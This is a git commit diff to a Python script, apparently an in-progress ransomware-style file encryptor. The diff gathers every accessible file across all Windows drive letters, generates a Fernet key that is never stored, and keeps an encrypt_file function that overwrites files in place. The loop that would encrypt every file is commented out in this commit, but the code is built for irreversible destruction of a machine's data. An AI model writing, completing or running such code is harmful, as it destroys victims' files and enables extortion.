ef3cead256c134944b9c18294ef0b7034767a9c6
Luxury-Karma <alexgauv@hotmail.ca>
2023-02-04 14:03:26 -0500

    update

--- main.py
+++ main.py
@@ -45,16 +45,17 @@ def get_all_accessible():
     find all the directorys in the computer
     '''
     possible_Init = string.ascii_uppercase
+    directorys = []
+    files = []
+    ended_directory = []
     for i in possible_Init :
         init_path = f'{i}:\\'
 
         try:
-            directorys = []
-            files = []
-            ended_directory = []
+
             directorys.append(init_path)
             directorys =get_all_accessible_folder_in_dir(init_path)
-            files = get_all_accessible_files_in_Dir(init_path)
+            files = files  + get_all_accessible_files_in_Dir(init_path)
             ended_directory.append(init_path)
             for e in directorys :
                 directorys = directorys + get_all_accessible_folder_in_dir(f'{e}\\')
@@ -66,6 +67,8 @@ def get_all_accessible():
             print(f'ended directorys : {ended_directory}')
         except:
             print('lol')
+    final = files
+    return final
 
 def encrypt_file(file_path,F_key):
     with open(file_path,'rb') as ef:
@@ -75,9 +78,29 @@ def encrypt_file(file_path,F_key):
         ef.write(edata)
 
 
+"""def encrypt_file(file_path,F_key):
+    print(f'Encrypthing File : {file_path}')
+    try:
+         with open(file_path,'rb') as ef:
+             data = ef.read()
+             print('can oppen the data')
+    except:
+        print(f'can\'t oppen the file {file_path}')"""
 
 
 
+
+
+
+
+
+
+cipher = Fernet(Fernet.generate_key())
+files = get_all_accessible()
+"""for e in files:
+    print(encrypt_file(e,cipher))"""
+
+print(f"The folder returned is : {files}")
 
 
 cipher = Fernet(Fernet.generate_key())
